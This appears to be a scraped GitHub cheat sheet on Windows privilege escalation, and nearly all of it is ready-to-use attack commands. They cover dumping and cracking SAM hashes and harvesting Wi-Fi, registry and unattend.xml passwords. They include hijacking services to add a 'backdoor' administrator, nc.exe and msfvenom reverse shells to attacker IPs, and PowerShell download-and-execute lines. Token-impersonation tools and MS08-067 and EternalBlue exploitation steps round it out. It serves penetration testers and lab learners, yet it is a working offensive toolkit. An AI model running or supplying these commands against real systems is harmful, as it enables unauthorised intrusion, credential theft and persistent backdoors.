# other notes

Skip to content



	• Tools

	• Windows Version and Configuration

	• User Enumeration

	• Network Enumeration

	• EoP - Looting for passwords

	• EoP - Processes Enumeration and Tasks

	• EoP - Incorrect permissions in services

	• EoP - Windows Subsystem for Linux \(WSL\)

	• EoP - Unquoted Service Paths

	• EoP - Kernel Exploitation

	• EoP - AlwaysInstallElevated

	• EoP - Insecure GUI apps

	• EoP - Runas

	• EoP - From local administrator to NT SYSTEM

	• EoP - Living Off The Land Binaries and Scripts

	• EoP - Impersonation Privileges

		○ RottenPotato \(Token Impersonation\)

		○ Juicy Potato \(abusing the golden privileges\)

	• EoP - Common Vulnerabilities and Exposures

		○ MS08-067 \(NetAPI\)

		○ MS10-015 \(KiTrap0D\)

		○ MS11-080 \(adf.sys\)

		○ MS16-032

		○ MS17-010 \(Eternal Blue\)

	• References

Tools

	• PowerSploit's PowerUppowershell -Version 2 -nop -exec bypass IEX \(New-Object Net.WebClient\).DownloadString\('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'\); Invoke-AllChecks

	• Watson - Watson is a \(.NET 2.0 compliant\) C\# implementation of Sherlock

	• \(Deprecated\) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilitiespowershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1

	• BeRoot - Privilege Escalation Project - Windows / Linux / Mac

	• Windows-Exploit-Suggester./windows-exploit-suggester.py --update./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 

	• windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems

	• WindowsExploits - Windows exploits, mostly precompiled. Not being updated.

	• WindowsEnum - A Powershell Privilege Escalation Enumeration Script.

	• Seatbelt - A C\# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.

	• Powerless - Windows privilege escalation \(enumeration\) script designed with OSCP labs \(legacy Windows\) in mind

	• JAWS - Just Another Windows \(Enum\) Scriptpowershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

Windows Version and Configuration

systeminfo \| findstr /B /C:"OS Name" /C:"OS Version"

Extract patchs and updates

wmic qfe

Architecture

wmic os get osarchitecture \|\| echo %PROCESSOR\_ARCHITECTURE%

List all env variables

setGet-ChildItem Env: \| ft Key,Value

List all drives

wmic logicaldisk get caption \|\| fsutil fsinfo driveswmic logicaldisk get caption,description,providernameGet-PSDrive \| where {$\_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}\| ft Name,Root

User Enumeration

Get current username

echo %USERNAME% \|\| whoami$env:username

List user privilege

whoami /priv

List all users

net userwhoami /allGet-LocalUser \| ft Name,Enabled,LastLogonGet-ChildItem C:\Users -Force \| select Name

List logon requirements; useable for bruteforcing

net accounts

Get details about a user \(i.e. administrator, admin, current user\)

net user administratornet user adminnet user %USERNAME%

List all local groups

net localgroupGet-LocalGroup \| ft Name

Get details about a group \(i.e. administrators\)

net localgroup administratorsGet-LocalGroupMember Administrators \| ft Name, PrincipalSourceGet-LocalGroupMember Administrateurs \| ft Name, PrincipalSource

Network Enumeration

List all network interfaces, IP, and DNS.

ipconfig /allGet-NetIPConfiguration \| ft InterfaceAlias,InterfaceDescription,IPv4AddressGet-DnsClientServerAddress -AddressFamily IPv4 \| ft

List current routing table

route printGet-NetRoute -AddressFamily IPv4 \| ft DestinationPrefix,NextHop,RouteMetric,ifIndex

List the ARP table

arp -AGet-NetNeighbor -AddressFamily IPv4 \| ft ifIndex,IPAddress,LinkLayerAddress,State

List all current connections

netstat -ano

List firewall state and current configuration

netsh advfirewall firewall dump

or 

netsh firewall show statenetsh firewall show config

List firewall's blocked ports

$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules \|  where {$\_.action -eq "0"} \| select name,applicationname,localports

Disable firewall

netsh firewall set opmode disablenetsh advfirewall set allprofiles state off

List all network shares

net share

SNMP Configuration

reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /sGet-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse

EoP - Looting for passwords

SAM and SYSTEM files

The Security Account Manager \(SAM\), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.

\# Usually %SYSTEMROOT% = C:\Windows%SYSTEMROOT%\repair\SAM%SYSTEMROOT%\System32\config\RegBack\SAM%SYSTEMROOT%\System32\config\SAM%SYSTEMROOT%\repair\system%SYSTEMROOT%\System32\config\SYSTEM%SYSTEMROOT%\System32\config\RegBack\system

Generate a hash file for John using pwdump or samdump2.

pwdump SYSTEM SAM &gt; /root/sam.txtsamdump2 SYSTEM SAM -o sam.txt

Then crack it with john -format=NT /root/sam.txt.

Search for file contents

cd C:\ & findstr /SI /M "password" \*.xml \*.ini \*.txtfindstr /si password \*.xml \*.ini \*.txt \*.configfindstr /spin "password" \*.\*

Search for a file with a certain filename

dir /S /B \*pass\*.txt == \*pass\*.xml == \*pass\*.ini == \*cred\* == \*vnc\* == \*.config\*where /R C:\ user.txtwhere /R C:\ \*.ini

Search the registry for key names and passwords

REG QUERY HKLM /F "password" /t REG\_SZ /S /KREG QUERY HKCU /F "password" /t REG\_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" \# Windows Autologinreg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2&gt;nul \| findstr "DefaultUserName DefaultDomainName DefaultPassword" reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" \# SNMP parametersreg query "HKCU\Software\SimonTatham\PuTTY\Sessions" \# Putty clear text proxy credentialsreg query "HKCU\Software\ORL\WinVNC3\Password" \# VNC credentialsreg query HKEY\_LOCAL\_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG\_SZ /sreg query HKCU /f password /t REG\_SZ /s

Read a value of a certain sub key

REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList

Passwords in unattend.xml

Location of the unattend.xml files.

C:\unattend.xmlC:\Windows\Panther\Unattend.xmlC:\Windows\Panther\Unattend\Unattend.xmlC:\Windows\system32\sysprep.infC:\Windows\system32\sysprep\sysprep.xml

Display the content of these files with dir /s \*sysprep.inf \*sysprep.xml \*unattended.xml \*unattend.xml \*unattend.txt 2&gt;nul.

Example content

&lt;component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64"&gt;    &lt;AutoLogon&gt;     &lt;Password&gt;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==&lt;/Password&gt;     &lt;Enabled&gt;true&lt;/Enabled&gt;     &lt;Username&gt;Administrateur&lt;/Username&gt;    &lt;/AutoLogon&gt;

&lt;UserAccounts&gt;     &lt;LocalAccounts&gt;      &lt;LocalAccount wcm:action="add"&gt;       &lt;Password&gt;\*SENSITIVE\*DATA\*DELETED\*&lt;/Password&gt;       &lt;Group&gt;administrators;users&lt;/Group&gt;       &lt;Name&gt;Administrateur&lt;/Name&gt;      &lt;/LocalAccount&gt;     &lt;/LocalAccounts&gt;    &lt;/UserAccounts&gt;

Unattend credentials are stored in base64 and can be decoded manually with base64.

$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  \| base64 -d SecretSecurePassword1234\*

The Metasploit module post/windows/gather/enum\_unattend looks for these files.

IIS Web config

Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.configC:\inetpub\wwwroot\web.config

Other files

%SYSTEMDRIVE%\pagefile.sys%WINDIR%\debug\NetSetup.log%WINDIR%\repair\sam%WINDIR%\repair\system%WINDIR%\repair\software, %WINDIR%\repair\security%WINDIR%\iis6.log%WINDIR%\system32\config\AppEvent.Evt%WINDIR%\system32\config\SecEvent.Evt%WINDIR%\system32\config\default.sav%WINDIR%\system32\config\security.sav%WINDIR%\system32\config\software.sav%WINDIR%\system32\config\system.sav%WINDIR%\system32\CCM\logs\\*.log%USERPROFILE%\ntuser.dat%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat%WINDIR%\System32\drivers\etc\hostsdir c:\*vnc.ini /s /bdir c:\*ultravnc.ini /s /b

Wifi passwords

Find AP SSID

netsh wlan show profile

Get Cleartext Pass

netsh wlan show profile &lt;SSID&gt; key=clear

Oneliner method to extract wifi passwords from all the access point.

cls & echo. & for /f "tokens=4 delims=: " %a in \('netsh wlan show profiles ^\| find "Profile "'\) do @echo off &gt; nul & \(netsh wlan show profiles name=%a key=clear \| findstr "SSID Cipher Content" \| find /v "Number" & echo.\) & @echo on

Passwords stored in services

Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher

https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1Import-Module path\to\SessionGopher.ps1;Invoke-SessionGopher -AllDomain -oInvoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss

EoP - Processes Enumeration and Tasks

What processes are running?

tasklist /vnet startsc queryGet-ServiceGet-WmiObject -Query "Select \* from Win32\_Process" \| where {$\_.Name -notlike "svchost\*"} \| Select Name, Handle, @{Label="Owner";Expression={$\_.GetOwner\(\).User}} \| ft -AutoSize

Which processes are running as "system"

tasklist /v /fi "username eq system"

Do you have powershell magic?

REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion

List installed programs

Get-ChildItem 'C:\Program Files', 'C:\Program Files \(x86\)' \| ft Parent,Name,LastWriteTimeGet-ChildItem -path Registry::HKEY\_LOCAL\_MACHINE\SOFTWARE \| ft Name

List services

net startwmic service list brieftasklist /SVC

Scheduled tasks

schtasks /query /fo LIST 2&gt;nul \| findstr TaskNameGet-ScheduledTask \| where {$\_.TaskPath -notlike "\Microsoft\*"} \| ft TaskName,TaskPath,State

Startup tasks

wmic startup get caption,commandreg query HKLM\Software\Microsoft\Windows\CurrentVersion\Rreg query HKCU\Software\Microsoft\Windows\CurrentVersion\Runreg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOncedir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"

EoP - Incorrect permissions in services

A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.

Often, services are pointing to writeable locations:

	• Orphaned installs, not installed anymore but still exist in startup

	• DLL Hijacking

	• PATH directories with weak permissions

$ for /f "tokens=2 delims='='" %a in \('wmic service list full^\|find /i "pathname"^\|find /i /v "system32"'\) do @echo %a &gt;&gt; c:\windows\temp\permissions.txt$ for /f eol^=^"^ delims^=^" %a in \(c:\windows\temp\permissions.txt\) do cmd.exe /c icacls "%a"

$ sc query state=all \| findstr "SERVICE\_NAME:" &gt;&gt; Servicenames.txtFOR /F %i in \(Servicenames.txt\) DO echo %itype Servicenames.txtFOR /F "tokens=2 delims= " %i in \(Servicenames.txt\) DO @echo %i &gt;&gt; services.txtFOR /F %i in \(services.txt\) DO @sc qc %i \| findstr "BINARY\_PATH\_NAME" &gt;&gt; path.txt

Alternatively you can use the Metasploit exploit : exploit/windows/local/service\_permissions

Note to check file permissions you can use cacls and icacls

icacls \(Windows Vista +\)

cacls \(Windows XP\)

You are looking for BUILTIN\Users:\(F\)\(Full access\), BUILTIN\Users:\(M\)\(Modify access\) or BUILTIN\Users:\(W\)\(Write-only access\) in the output.

Example with Windows XP SP1

\# NOTE: spaces are mandatory for this exploit to work !sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"sc config upnphost obj= ".\LocalSystem" password= ""sc qc upnphostsc config upnphost depend= ""net start upnphost

If it fails because of a missing dependency, try the following commands.

sc config SSDPSRV start=autonet start SSDPSRVnet stop upnphostnet start upnphost

sc config upnphost depend=""

Using accesschk from Sysinternals.

$ accesschk.exe -uwcqv "Authenticated Users" \* /accepteulaRW SSDPSRV        SERVICE\_ALL\_ACCESSRW upnphost        SERVICE\_ALL\_ACCESS

$ accesschk.exe -ucqv upnphostupnphost  RW NT AUTHORITY\SYSTEM        SERVICE\_ALL\_ACCESS  RW BUILTIN\Administrators        SERVICE\_ALL\_ACCESS  RW NT AUTHORITY\Authenticated Users        SERVICE\_ALL\_ACCESS  RW BUILTIN\Power Users        SERVICE\_ALL\_ACCESS

$ sc config &lt;vuln-service&gt; binpath="net user backdoor backdoor123 /add"$ sc config &lt;vuln-service&gt; binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"$ sc stop &lt;vuln-service&gt;$ sc start &lt;vuln-service&gt;$ sc config &lt;vuln-service&gt; binpath="net localgroup Administrators backdoor /add"$ sc stop &lt;vuln-service&gt;$ sc start &lt;vuln-service&gt;

EoP - Windows Subsystem for Linux \(WSL\)

Technique borrowed from Warlockobama's tweet

With root privileges Windows Subsystem for Linux \(WSL\) allows users to create a bind shell on any port \(no elevation needed\). Don't know the root password? No problem just set the default user to root W/ .exe --default-user root. Now start your bind shell or reverse.

wsl whoami./ubuntun1604.exe config --default-user rootwsl whoamiwsl python -c 'BIND\_OR\_REVERSE\_SHELL\_PYTHON\_CODE'

Binary bash.exe can also be found in C:\Windows\WinSxS\amd64\_microsoft-windows-lxssbash\_\[...\]\bash.exe

Alternatively you can explore the WSL filesystem in the folder C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows\_79rhkp1fndgsc\LocalState\rootfs\

EoP - Unquoted Service Paths

The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.

wmic service get name,displayname,pathname,startmode \|findstr /i "Auto" \|findstr /i /v "C:\Windows\\" \|findstr /i /v """

gwmi -class Win32\_Service -Property Name, DisplayName, PathName, StartMode \| Where {$\_.StartMode -eq "Auto" -and $\_.PathName -notlike "C:\Windows\*" -and $\_.PathName -notlike '"\*'} \| select PathName,DisplayName,Name

Metasploit provides the exploit : exploit/windows/local/trusted\_service\_path

Example

For C:\Program Files\something\legit.exe, Windows will try the following paths first:

	• C:\Program.exe

	• C:\Program Files.exe

EoP - Kernel Exploitation

List of exploits kernel : https://github.com/SecWiki/windows-kernel-exploits

\#Security Bulletin   \#KB     \#Description    \#Operating System

	• MS17-017 \[KB4013081\]　　\[GDI Palette Objects Local Privilege Escalation\]　　\(windows 7/8\)

	• CVE-2017-8464 \[LNK Remote Code Execution Vulnerability\]　　\(windows 10/8.1/7/2016/2010/2008\)

	• CVE-2017-0213 \[Windows COM Elevation of Privilege Vulnerability\]　　\(windows 10/8.1/7/2016/2010/2008\)

	• CVE-2018-0833 \[SMBv3 Null Pointer Dereference Denial of Service\] \(Windows 8.1/Server 2012 R2\)

	• CVE-2018-8120 \[Win32k Elevation of Privilege Vulnerability\] \(Windows 7 SP1/2008 SP2,2008 R2 SP1\)

	• MS17-010 \[KB4013389\]　　\[Windows Kernel Mode Drivers\]　　\(windows 7/2008/2003/XP\)

	• MS16-135 \[KB3199135\]　　\[Windows Kernel Mode Drivers\]　　\(2016\)

	• MS16-111 \[KB3186973\]　　\[kernel api\]　　\(Windows 10 10586 \(32/64\)/8.1\)

	• MS16-098 \[KB3178466\]　　\[Kernel Driver\]　　\(Win 8.1\)

	• MS16-075 \[KB3164038\]　　\[Hot Potato\]　　\(2003/2008/7/8/2012\)

	• MS16-034 \[KB3143145\]　　\[Kernel Driver\]　　\(2008/7/8/10/2012\)

	• MS16-032 \[KB3143141\]　　\[Secondary Logon Handle\]　　\(2008/7/8/10/2012\)

	• MS16-016 \[KB3136041\]　　\[WebDAV\]　　\(2008/Vista/7\)

	• MS16-014 \[K3134228\]　　\[remote code execution\]　　\(2008/Vista/7\)...

	• MS03-026 \[KB823980\]　　 \[Buffer Overrun In RPC Interface\]　　\(/NT/2000/XP/2003\)

To cross compile a program from Kali, use the following command.

Kali&gt; i586-mingw32msvc-gcc -o adduser.exe useradd.c

EoP - AlwaysInstallElevated

Check if these registry values are set to "1".

$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Then create an MSI package and install it.

$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi$ msiexec /quiet /qn /i C:\evil.msi

Technique also available in Metasploit : exploit/windows/local/always\_install\_elevated

EoP - Insecure GUI apps

Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.

Example: "Windows Help and Support" \(Windows + F1\), search for "command prompt", click on "Click to open Command Prompt"

EoP - Runas

Use the cmdkey to list the stored credentials on the machine.

cmdkey /listCurrently stored credentials: Target: Domain:interactive=WORKGROUP\Administrator Type: Domain Password User: WORKGROUP\Administrator

Then you can use runas with the /savecred options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.

runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"

Using runas with a provided set of credential.

C:\Windows\System32\runas.exe /env /noprofile /user:&lt;username&gt; &lt;password&gt; "c:\users\Public\nc.exe -nc &lt;attacker-ip&gt; 4444 -e cmd.exe"

$ secpasswd = ConvertTo-SecureString "&lt;password&gt;" -AsPlainText -Force$ mycreds = New-Object System.Management.Automation.PSCredential \("&lt;user&gt;", $secpasswd\)$ computer = "&lt;hostname&gt;"\[System.Diagnostics.Process\]::Start\("C:\users\public\nc.exe","&lt;attacker\_ip&gt; 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer\)

EoP - From local administrator to NT SYSTEM

PsExec.exe -i -s cmd.exe

EoP - Living Off The Land Binaries and Scripts

Living Off The Land Binaries and Scripts \(and also Libraries\) : https://lolbas-project.github.io/

The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.

A LOLBin/Lib/Script must:

	• Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft. Have extra "unexpected" functionality. It is not interesting to document intended use cases. Exceptions are application whitelisting bypasses

	• Have functionality that would be useful to an APT or red team

wmic.exe process call create calcregsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dllMicrosoft.Workflow.Compiler.exe tests.xml results.xml

EoP - Impersonation Privileges

RottenPotato \(Token Impersonation\)

Binary available at : https://github.com/foxglovesec/RottenPotato Binary available at : https://github.com/breenmachine/RottenPotatoNG

getuidgetprivsuse incognitolist\\_tokens -ucd c:\temp\execute -Hc -f ./rot.exeimpersonate\\_token "NT AUTHORITY\SYSTEM"

Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"Get-Process wininit \| Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX \(New-Object Net.WebClient\).DownloadString\('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1'\);\"};"

Juicy Potato \(abusing the golden privileges\)

Binary available at : https://github.com/ohpe/juicy-potato/releases

	1. Check the privileges of the service account, you should look for SeImpersonate and/or SeAssignPrimaryToken\(Impersonate a client after authentication\)whoami /priv

	2. Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object

		○ Windows 7 Enterprise

		○ Windows 8.1 Enterprise

		○ Windows 10 Enterprise

		○ Windows 10 Professional

		○ Windows Server 2008 R2 Enterprise

		○ Windows Server 2012 Datacenter

		○ Windows Server 2016 Standard

	3. Execute JuicyPotato to run a privileged command.juicypotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}juicypotato.exe -l 1340 -p C:\users\User\rev.bat -t \* -c {e60687f7-01a1-40aa-86ac-db1cbf673334}\# -l : local listener port

EoP - Common Vulnerabilities and Exposure

MS08-067 \(NetAPI\)

Check the vulnerability with the following nmap script.

nmap -Pn -p445 --open --max-hostgroup 3--script smb-vuln-ms08-067 &lt;ip\_netblock&gt;

Metasploit modules to exploit MS08-067 NetAPI.

exploit/windows/smb/ms08\_067\_netapi

If you can't use Metasploit and only want a reverse shell.

https://raw.githubusercontent.com/jivoi/pentest/master/exploit\_win/ms08-067.pymsfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows

Example: MS08\_067\_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445Example: MS08\_067\_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 \(445 could also be used\)Example: MS08\_067\_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 UniversalExample: MS08\_067\_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 EnglishExample: MS08\_067\_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French \(NX\)Example: MS08\_067\_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English \(NX\)Example: MS08\_067\_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English \(AlwaysOn NX\)python ms08-067.py 10.0.0.1 6 445

MS10-015 \(KiTrap0D\) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7

'KiTrap0D' User Mode to Ring Escalation \(MS10-015\)

https://www.exploit-db.com/exploits/11199

Metasploit : exploit/windows/local/ms10\_015\_kitrap0d

MS11-080 \(afd.sys\) - Microsoft Windows XP/2003

Python: https://www.exploit-db.com/exploits/18176Metasploit: exploit/windows/local/ms11\_080\_afdjoinleaf

MS16-032 - Microsoft Windows 7 &lt; 10 / 2008 &lt; 2012 R2 \(x86/x64\)

Check if the patch is installed : wmic qfe list \| findstr "3139914"

Powershell:https://www.exploit-db.com/exploits/39719/https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1

Binary exe : https://github.com/Meatballs1/ms16-032

Metasploit : exploit/windows/local/ms16\_032\_secondary\_logon\_handle\_privesc

MS17-010 \(Eternal Blue\)

Check the vulnerability with the following nmap script.

nmap -Pn -p445 --open --max-hostgroup 3--script smb-vuln-ms17–010 &lt;ip\_netblock&gt;

Metasploit modules to exploit EternalRomance/EternalSynergy/EternalChampion.

auxiliary/admin/smb/ms17\_010\_command          MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Executionauxiliary/scanner/smb/smb\_ms17\_010            MS17-010 SMB RCE Detectionexploit/windows/smb/ms17\_010\_eternalblue      MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruptionexploit/windows/smb/ms17\_010\_eternalblue\_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+exploit/windows/smb/ms17\_010\_psexec           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution

If you can't use Metasploit and only want a reverse shell.

git clone https://github.com/helviojunior/MS17-010

\# generate a simple reverse shell to usemsfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exepython2 send\_and\_execute.py 10.0.0.1 revshell.exe

References

	• Windows Internals Book - 02/07/2017

	• icacls - Docs Microsoft

	• Privilege Escalation Windows - Philip Linghammar

	• Windows elevation of privileges - Guifre Ruiz

	• The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte

	• Basic Linux Privilege Escalation

	• Windows Privilege Escalation Fundamentals

	• TOP–10 ways to boost your privileges in Windows systems - hackmag

	• The SYSTEM Challenge

	• Windows Privilege Escalation Guide - absolomb's security blog

	• Chapter 4 - Windows Post-Exploitation - 2 Nov 2017 - dostoevskylabs

	• Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell

	• Pentestlab.blog - WPE-01 - Stored Credentials

	• Pentestlab.blog - WPE-02 - Windows Kernel

	• Pentestlab.blog - WPE-03 - DLL Injection

	• Pentestlab.blog - WPE-04 - Weak Service Permissions

	• Pentestlab.blog - WPE-05 - DLL Hijacking

	• Pentestlab.blog - WPE-06 - Hot Potato

	• Pentestlab.blog - WPE-07 - Group Policy Preferences

	• Pentestlab.blog - WPE-08 - Unquoted Service Path

	• Pentestlab.blog - WPE-09 - Always Install Elevated

	• Pentestlab.blog - WPE-10 - Token Manipulation

	• Pentestlab.blog - WPE-11 - Secondary Logon Handle

	• Pentestlab.blog - WPE-12 - Insecure Registry Permissions

	• Pentestlab.blog - WPE-13 - Intel SYSRET

	• Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @xpn

	• Living Off The Land Binaries and Scripts \(and now also Libraries\)

	• © 2019 GitHub, Inc.

	• Terms

	• Privacy

	• Security

	• Status

	• Help

	• Contact GitHub

	• Pricing

	• API

	• Training

	• Blog

	• About



